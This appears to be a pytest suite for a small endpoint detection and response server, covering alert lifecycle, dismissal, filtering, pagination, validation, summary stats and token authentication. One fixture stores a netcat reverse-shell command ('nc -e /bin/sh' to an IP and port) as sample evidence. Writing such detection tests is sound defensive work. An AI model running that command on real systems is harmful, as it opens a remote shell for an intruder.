"""Comprehensive tests for Phase 6: Alert and Incident Management.

Covers:
- Alert lifecycle: NEW -> ACKNOWLEDGED -> RESOLVED.
- Direct transition: NEW -> RESOLVED.
- Alert dismissal (false positive / ignored) with default or custom note.
- State transition guards (preventing RESOLVED -> ACKNOWLEDGED).
- Idempotent operations for acknowledge, resolve, and dismiss.
- Alert detail with linked security events and foreign key integrity.
- Listing with filtering (status, severity, agent_id, rule_id).
- Pagination (limit, offset) and boundary checks.
- Input validation (status, severity, limit, offset, note length).
- Alert aggregation summary and stats endpoints (/api/v1/alerts/summary, /alerts/stats).
- Authentication enforcement on all alert management routes.
"""

from datetime import datetime, timezone
import pytest

from server.app import create_app
from server.repositories.alert_repository import AlertRepository
from server.repositories.endpoint_repository import EndpointRepository
from server.repositories.event_repository import EventRepository

TOKEN = "test-alert-mgmt-token"


def _utc_now():
    return datetime.now(timezone.utc).isoformat()


@pytest.fixture()
def app(tmp_path):
    db_path = tmp_path / "mini_edr_alerts.db"
    application = create_app({
        "TESTING": True,
        "EDR_API_TOKEN": TOKEN,
        "DATABASE_PATH": str(db_path),
        "OFFLINE_AFTER_SECONDS": 30,
    })
    application.config["TEST_DATABASE_PATH"] = db_path
    return application


@pytest.fixture()
def client(app):
    return app.test_client()


def auth_headers(token=TOKEN):
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture()
def setup_data(app):
    """Seed agents, events, and alerts for testing."""
    db_path = app.config["DATABASE_PATH"]
    endpoint_repo = EndpointRepository(db_path)
    alert_repo = AlertRepository(db_path)
    event_repo = EventRepository(db_path)

    # Register 3 agents
    agents = ["agent-alpha", "agent-beta", "agent-gamma"]
    for aid in agents:
        endpoint_repo.upsert({
            "agent_id": aid,
            "hostname": f"{aid}-host",
            "os": "Linux 6.8",
            "ip_address": "10.0.0.1",
            "agent_version": "1.0.0",
            "last_seen": _utc_now(),
        })

    # Record some security events
    ev1 = event_repo.record({
        "message_id": "msg-ev-001",
        "agent_id": "agent-alpha",
        "event_type": "suspicious_process_spawn",
        "severity": "critical",
        "source": "detection",
        "title": "Reverse shell detected",
        "description": "nc spawned /bin/sh",
        "evidence_json": {"pid": 1234, "cmd": "nc -e /bin/sh 1.2.3.4 4444"},
        "occurred_at": "2026-11-05T10:00:00Z",
        "received_at": "2026-11-05T10:00:01Z",
    })
    ev2 = event_repo.record({
        "message_id": "msg-ev-002",
        "agent_id": "agent-alpha",
        "event_type": "fim_sensitive_file",
        "severity": "high",
        "source": "detection",
        "title": "/etc/shadow modified",
        "description": "Sensitive credential store altered",
        "evidence_json": {"path": "/etc/shadow"},
        "occurred_at": "2026-11-05T10:05:00Z",
        "received_at": "2026-11-05T10:05:01Z",
    })

    # Create distinct alerts across statuses, severities, agents, and rules
    a1 = alert_repo.create_or_update({
        "alert_key": "alert:agent-alpha:proc_reverse_shell",
        "agent_id": "agent-alpha",
        "rule_id": "proc_reverse_shell",
        "title": "Reverse Shell Spawned",
        "description": "Active reverse shell detected on host",
        "severity": "critical",
        "status": "new",
        "first_seen_at": "2026-11-05T10:00:00Z",
        "last_seen_at": "2026-11-05T10:00:00Z",
    }, event_ids=[ev1["id"]])

    a2 = alert_repo.create_or_update({
        "alert_key": "alert:agent-alpha:fim_sensitive_file",
        "agent_id": "agent-alpha",
        "rule_id": "fim_sensitive_file",
        "title": "Sensitive File Tampering",
        "description": "Unauthorized change to /etc/shadow",
        "severity": "high",
        "status": "new",
        "first_seen_at": "2026-11-05T10:05:00Z",
        "last_seen_at": "2026-11-05T10:05:00Z",
    }, event_ids=[ev2["id"]])

    a3 = alert_repo.create_or_update({
        "alert_key": "alert:agent-beta:proc_suspicious_dir",
        "agent_id": "agent-beta",
        "rule_id": "proc_suspicious_dir",
        "title": "Execution from /tmp",
        "description": "Binary executed from temporary folder",
        "severity": "medium",
        "status": "acknowledged",
        "first_seen_at": "2026-11-05T09:00:00Z",
        "last_seen_at": "2026-11-05T09:00:00Z",
        "acknowledged_at": "2026-11-05T09:10:00Z",
    })

    a4 = alert_repo.create_or_update({
        "alert_key": "alert:agent-beta:high_resource_anomaly",
        "agent_id": "agent-beta",
        "rule_id": "high_cpu_anomaly",
        "title": "High CPU Anomaly",
        "description": "Cryptomining suspect consuming 99% CPU",
        "severity": "low",
        "status": "new",
        "first_seen_at": "2026-11-05T08:00:00Z",
        "last_seen_at": "2026-11-05T08:00:00Z",
    })

    a5 = alert_repo.create_or_update({
        "alert_key": "alert:agent-gamma:info_maintenance",
        "agent_id": "agent-gamma",
        "rule_id": "fim_sensitive_file",
        "title": "Routine Baseline Update",
        "description": "Scheduled system update",
        "severity": "info",
        "status": "resolved",
        "first_seen_at": "2026-11-05T07:00:00Z",
        "last_seen_at": "2026-11-05T07:00:00Z",
        "resolved_at": "2026-11-05T07:30:00Z",
        "resolution_note": "Normal system patch",
    })

    return {
        "agents": agents,
        "events": [ev1, ev2],
        "alerts": [a1, a2, a3, a4, a5],
    }


# =============================================================================
# Lifecycle Tests
# =============================================================================

def test_alert_lifecycle_new_to_acknowledged_to_resolved(client, setup_data):
    """Test full standard incident lifecycle: NEW -> ACKNOWLEDGED -> RESOLVED."""
    alert = setup_data["alerts"][0]  # new, critical
    alert_id = alert["id"]

    # Initial state
    res = client.get(f"/api/v1/alerts/{alert_id}", headers=auth_headers())
    assert res.status_code == 200
    assert res.get_json()["alert"]["status"] == "new"
    assert res.get_json()["alert"]["acknowledged_at"] is None
    assert res.get_json()["alert"]["resolved_at"] is None

    # Step 1: Acknowledge with operator note
    ack_res = client.post(
        f"/api/v1/alerts/{alert_id}/acknowledge",
        json={"note": "Investigating incident by SOC tier 1"},
        headers=auth_headers(),
    )
    assert ack_res.status_code == 200
    ack_data = ack_res.get_json()
    assert ack_data["success"] is True
    assert ack_data["status"] == "acknowledged"
    assert ack_data["acknowledged_at"] is not None
    assert ack_data["resolution_note"] == "Investigating incident by SOC tier 1"

    # Step 2: Resolve with resolution note
    resolve_res = client.post(
        f"/api/v1/alerts/{alert_id}/resolve",
        json={"resolution_note": "Host isolated and malicious binary purged"},
        headers=auth_headers(),
    )
    assert resolve_res.status_code == 200
    res_data = resolve_res.get_json()
    assert res_data["success"] is True
    assert res_data["status"] == "resolved"
    assert res_data["resolved_at"] is not None
    assert res_data["resolution_note"] == "Host isolated and malicious binary purged"

    # Verify final state via detail
    final_res = client.get(f"/api/v1/alerts/{alert_id}", headers=auth_headers())
    final_alert = final_res.get_json()["alert"]
    assert final_alert["status"] == "resolved"
    assert final_alert["acknowledged_at"] is not None
    assert final_alert["resolved_at"] is not None
    assert final_alert["resolution_note"] == "Host isolated and malicious binary purged"


def test_alert_direct_new_to_resolved(client, setup_data):
    """Test direct transition from NEW to RESOLVED without prior acknowledgment."""
    alert = setup_data["alerts"][1]  # new, high
    alert_id = alert["id"]

    res = client.post(
        f"/api/v1/alerts/{alert_id}/resolve",
        json={"resolution_note": "Direct resolution by senior engineer"},
        headers=auth_headers(),
    )
    assert res.status_code == 200
    body = res.get_json()
    assert body["status"] == "resolved"
    assert body["resolution_note"] == "Direct resolution by senior engineer"

    detail = client.get(f"/api/v1/alerts/{alert_id}", headers=auth_headers()).get_json()["alert"]
    assert detail["status"] == "resolved"
    assert detail["acknowledged_at"] is None
    assert detail["resolved_at"] is not None


def test_alert_dismissal_default_note(client, setup_data):
    """Test dismissing an alert with default false-positive note."""
    alert = setup_data["alerts"][3]  # new, low
    alert_id = alert["id"]

    res = client.post(f"/api/v1/alerts/{alert_id}/dismiss", headers=auth_headers())
    assert res.status_code == 200
    body = res.get_json()
    assert body["success"] is True
    assert body["status"] == "resolved"
    assert body["dismissed"] is True
    assert "Dismissed by operator (false positive / ignored)" in body["resolution_note"]

    # Check via detail
    detail = client.get(f"/api/v1/alerts/{alert_id}", headers=auth_headers()).get_json()["alert"]
    assert detail["status"] == "resolved"
    assert "Dismissed by operator" in detail["resolution_note"]


def test_alert_dismissal_custom_note(client, setup_data):
    """Test dismissing an alert with custom false-positive reason."""
    alert = setup_data["alerts"][2]  # acknowledged, medium
    alert_id = alert["id"]

    res = client.post(
        f"/api/v1/alerts/{alert_id}/dismiss",
        json={"resolution_note": "Legitimate CI pipeline runner script"},
        headers=auth_headers(),
    )
    assert res.status_code == 200
    body = res.get_json()
    assert body["status"] == "resolved"
    assert body["resolution_note"] == "Legitimate CI pipeline runner script"
    assert body["dismissed"] is True


# =============================================================================
# State Transition Guards & Idempotency Tests
# =============================================================================

def test_guard_cannot_acknowledge_resolved_alert(client, setup_data):
    """Guard: A resolved alert cannot transition back to acknowledged (returns 400)."""
    alert = setup_data["alerts"][4]  # already resolved
    alert_id = alert["id"]

    res = client.post(f"/api/v1/alerts/{alert_id}/acknowledge", headers=auth_headers())
    assert res.status_code == 400
    assert "cannot be acknowledged" in res.get_json()["error"]


def test_acknowledge_idempotency(client, setup_data):
    """Acknowledge is idempotent: second call returns 200 without changing timestamp."""
    alert = setup_data["alerts"][0]
    alert_id = alert["id"]

    res1 = client.post(f"/api/v1/alerts/{alert_id}/acknowledge", headers=auth_headers())
    assert res1.status_code == 200
    ack1_time = res1.get_json()["acknowledged_at"]

    res2 = client.post(f"/api/v1/alerts/{alert_id}/acknowledge", headers=auth_headers())
    assert res2.status_code == 200
    assert res2.get_json()["acknowledged_at"] == ack1_time


def test_resolve_idempotency(client, setup_data):
    """Resolve is idempotent: repeat call returns 200 without changing timestamp."""
    alert = setup_data["alerts"][4]  # already resolved
    alert_id = alert["id"]
    orig_time = alert["resolved_at"]

    res = client.post(
        f"/api/v1/alerts/{alert_id}/resolve",
        json={"resolution_note": "Attempt to re-resolve"},
        headers=auth_headers(),
    )
    assert res.status_code == 200
    body = res.get_json()
    assert body["status"] == "resolved"
    assert body["resolved_at"] == orig_time


def test_dismiss_idempotency(client, setup_data):
    """Dismiss is idempotent on resolved alerts: returns 200 without altering resolved_at."""
    alert = setup_data["alerts"][4]  # already resolved
    alert_id = alert["id"]
    orig_time = alert["resolved_at"]

    res = client.post(f"/api/v1/alerts/{alert_id}/dismiss", headers=auth_headers())
    assert res.status_code == 200
    body = res.get_json()
    assert body["status"] == "resolved"
    assert body["resolved_at"] == orig_time
    assert body["dismissed"] is True


# =============================================================================
# Alert Detail & Linked Security Events
# =============================================================================

def test_alert_detail_includes_linked_events(client, setup_data):
    """Alert detail endpoint includes linked security events."""
    alert = setup_data["alerts"][0]  # alert 1 is linked to ev1
    alert_id = alert["id"]

    res = client.get(f"/api/v1/alerts/{alert_id}", headers=auth_headers())
    assert res.status_code == 200
    body = res.get_json()
    assert body["success"] is True
    alert_detail = body["alert"]
    assert alert_detail["id"] == alert_id
    assert "events" in alert_detail
    assert len(alert_detail["events"]) == 1
    assert alert_detail["events"][0]["event_type"] == "suspicious_process_spawn"
    assert alert_detail["events"][0]["severity"] == "critical"


def test_alert_not_found(client):
    """Unknown alert IDs return HTTP 404."""
    assert client.get("/api/v1/alerts/99999", headers=auth_headers()).status_code == 404
    assert client.post("/api/v1/alerts/99999/acknowledge", headers=auth_headers()).status_code == 404
    assert client.post("/api/v1/alerts/99999/resolve", headers=auth_headers()).status_code == 404
    assert client.post("/api/v1/alerts/99999/dismiss", headers=auth_headers()).status_code == 404


# =============================================================================
# Listing, Filtering, and Pagination
# =============================================================================

def test_list_alerts_total_and_count(client, setup_data):
    """Listing alerts returns both total matching count and page items."""
    res = client.get("/api/v1/alerts", headers=auth_headers())
    assert res.status_code == 200
    body = res.get_json()
    assert body["success"] is True
    assert body["total"] == 5
    assert body["count"] == 5
    assert len(body["alerts"]) == 5


def test_filter_by_status(client, setup_data):
    """Filter alerts by status: new, acknowledged, resolved."""
    # status=new
    res_new = client.get("/api/v1/alerts?status=new", headers=auth_headers())
    assert res_new.status_code == 200
    assert res_new.get_json()["total"] == 3
    assert all(a["status"] == "new" for a in res_new.get_json()["alerts"])

    # status=acknowledged
    res_ack = client.get("/api/v1/alerts?status=acknowledged", headers=auth_headers())
    assert res_ack.status_code == 200
    assert res_ack.get_json()["total"] == 1
    assert res_ack.get_json()["alerts"][0]["status"] == "acknowledged"

    # status=resolved
    res_res = client.get("/api/v1/alerts?status=resolved", headers=auth_headers())
    assert res_res.status_code == 200
    assert res_res.get_json()["total"] == 1
    assert res_res.get_json()["alerts"][0]["status"] == "resolved"


def test_filter_by_severity(client, setup_data):
    """Filter alerts by severity level."""
    res_crit = client.get("/api/v1/alerts?severity=critical", headers=auth_headers())
    assert res_crit.status_code == 200
    assert res_crit.get_json()["total"] == 1
    assert res_crit.get_json()["alerts"][0]["severity"] == "critical"

    res_high = client.get("/api/v1/alerts?severity=high", headers=auth_headers())
    assert res_high.status_code == 200
    assert res_high.get_json()["total"] == 1
    assert res_high.get_json()["alerts"][0]["severity"] == "high"


def test_filter_by_agent_id(client, setup_data):
    """Filter alerts by agent_id."""
    res_alpha = client.get("/api/v1/alerts?agent_id=agent-alpha", headers=auth_headers())
    assert res_alpha.status_code == 200
    assert res_alpha.get_json()["total"] == 2
    assert all(a["agent_id"] == "agent-alpha" for a in res_alpha.get_json()["alerts"])

    res_gamma = client.get("/api/v1/alerts?agent_id=agent-gamma", headers=auth_headers())
    assert res_gamma.status_code == 200
    assert res_gamma.get_json()["total"] == 1


def test_filter_by_rule_id(client, setup_data):
    """Filter alerts by rule_id."""
    res_fim = client.get("/api/v1/alerts?rule_id=fim_sensitive_file", headers=auth_headers())
    assert res_fim.status_code == 200
    assert res_fim.get_json()["total"] == 2
    assert all(a["rule_id"] == "fim_sensitive_file" for a in res_fim.get_json()["alerts"])


def test_combined_filters(client, setup_data):
    """Combine multiple filters simultaneously."""
    res = client.get("/api/v1/alerts?agent_id=agent-alpha&severity=critical&status=new", headers=auth_headers())
    assert res.status_code == 200
    body = res.get_json()
    assert body["total"] == 1
    assert body["alerts"][0]["rule_id"] == "proc_reverse_shell"


def test_pagination_limits_and_offsets(client, setup_data):
    """Pagination slicing works accurately with limit and offset."""
    # First page of 2
    p1 = client.get("/api/v1/alerts?limit=2&offset=0", headers=auth_headers()).get_json()
    assert p1["total"] == 5
    assert p1["count"] == 2
    p1_ids = [a["id"] for a in p1["alerts"]]

    # Second page of 2
    p2 = client.get("/api/v1/alerts?limit=2&offset=2", headers=auth_headers()).get_json()
    assert p2["total"] == 5
    assert p2["count"] == 2
    p2_ids = [a["id"] for a in p2["alerts"]]
    assert set(p1_ids).isdisjoint(set(p2_ids))

    # Third page (remaining 1)
    p3 = client.get("/api/v1/alerts?limit=2&offset=4", headers=auth_headers()).get_json()
    assert p3["total"] == 5
    assert p3["count"] == 1

    # Out of range offset
    p_empty = client.get("/api/v1/alerts?limit=2&offset=20", headers=auth_headers()).get_json()
    assert p_empty["total"] == 5
    assert p_empty["count"] == 0
    assert p_empty["alerts"] == []


# =============================================================================
# Validation and Error Handling Tests
# =============================================================================

@pytest.mark.parametrize("param_str,expected_err", [
    ("status=invalid_status", "Invalid status filter"),
    ("severity=extreme", "Invalid severity filter"),
    ("limit=0", "limit must be between 1 and 100"),
    ("limit=-5", "limit must be between 1 and 100"),
    ("limit=101", "limit must be between 1 and 100"),
    ("limit=abc", "limit must be a valid integer"),
    ("offset=-1", "offset must be an integer >= 0"),
    ("offset=xyz", "offset must be a valid integer"),
])
def test_filter_validation_errors(client, param_str, expected_err):
    """Invalid query parameters return HTTP 400 with descriptive error."""
    res = client.get(f"/api/v1/alerts?{param_str}", headers=auth_headers())
    assert res.status_code == 400
    assert expected_err in res.get_json()["error"]


def test_note_length_validation(client, setup_data):
    """Resolution note exceeding 2000 chars returns HTTP 400."""
    alert_id = setup_data["alerts"][0]["id"]
    huge_note = "A" * 2001

    res_ack = client.post(
        f"/api/v1/alerts/{alert_id}/acknowledge",
        json={"note": huge_note},
        headers=auth_headers(),
    )
    assert res_ack.status_code == 400
    assert "at most 2000 characters" in res_ack.get_json()["error"]

    res_res = client.post(
        f"/api/v1/alerts/{alert_id}/resolve",
        json={"resolution_note": huge_note},
        headers=auth_headers(),
    )
    assert res_res.status_code == 400
    assert "at most 2000 characters" in res_res.get_json()["error"]

    res_dism = client.post(
        f"/api/v1/alerts/{alert_id}/dismiss",
        json={"note": huge_note},
        headers=auth_headers(),
    )
    assert res_dism.status_code == 400
    assert "at most 2000 characters" in res_dism.get_json()["error"]


# =============================================================================
# Summary and Statistics Aggregation Tests
# =============================================================================

def test_alerts_summary_global(client, setup_data):
    """Alert summary returns correct overall aggregation breakdown."""
    res = client.get("/api/v1/alerts/summary", headers=auth_headers())
    assert res.status_code == 200
    body = res.get_json()
    assert body["success"] is True

    summary = body["summary"]
    assert summary["total_alerts"] == 5
    assert summary["open_alerts"] == 4  # 3 new + 1 acknowledged
    assert summary["resolved_alerts"] == 1
    assert summary["critical_and_high_alerts"] == 2  # 1 critical + 1 high

    assert summary["by_status"]["new"] == 3
    assert summary["by_status"]["acknowledged"] == 1
    assert summary["by_status"]["resolved"] == 1

    assert summary["by_severity"]["critical"] == 1
    assert summary["by_severity"]["high"] == 1
    assert summary["by_severity"]["medium"] == 1
    assert summary["by_severity"]["low"] == 1
    assert summary["by_severity"]["info"] == 1


def test_alerts_summary_filtered_by_agent(client, setup_data):
    """Alert summary can be filtered by agent_id."""
    res = client.get("/api/v1/alerts/summary?agent_id=agent-alpha", headers=auth_headers())
    assert res.status_code == 200
    summary = res.get_json()["summary"]
    assert summary["total_alerts"] == 2
    assert summary["open_alerts"] == 2
    assert summary["resolved_alerts"] == 0
    assert summary["critical_and_high_alerts"] == 2
    assert summary["by_severity"]["critical"] == 1
    assert summary["by_severity"]["high"] == 1


def test_alerts_stats_alias_endpoint(client, setup_data):
    """GET /api/v1/alerts/stats functions as an alias to /summary."""
    res = client.get("/api/v1/alerts/stats", headers=auth_headers())
    assert res.status_code == 200
    body = res.get_json()
    assert body["success"] is True
    assert body["summary"]["total_alerts"] == 5


# =============================================================================
# Authentication Tests
# =============================================================================

@pytest.mark.parametrize("method,endpoint", [
    ("GET", "/api/v1/alerts"),
    ("GET", "/api/v1/alerts/1"),
    ("GET", "/api/v1/alerts/summary"),
    ("GET", "/api/v1/alerts/stats"),
    ("POST", "/api/v1/alerts/1/acknowledge"),
    ("POST", "/api/v1/alerts/1/resolve"),
    ("POST", "/api/v1/alerts/1/dismiss"),
])
def test_alerts_endpoints_require_authentication(client, method, endpoint):
    """All alert endpoints strictly reject requests without valid Bearer token."""
    # No auth header -> 401
    res_no_auth = client.open(endpoint, method=method)
    assert res_no_auth.status_code == 401
    assert res_no_auth.get_json()["error"] == "unauthorized"
    assert "Bearer" in res_no_auth.headers.get("WWW-Authenticate", "")

    # Invalid token -> 401
    res_bad_auth = client.open(endpoint, method=method, headers=auth_headers("invalid-token-123"))
    assert res_bad_auth.status_code == 401
    assert res_bad_auth.get_json()["error"] == "unauthorized"
    assert "Bearer" in res_bad_auth.headers.get("WWW-Authenticate", "")
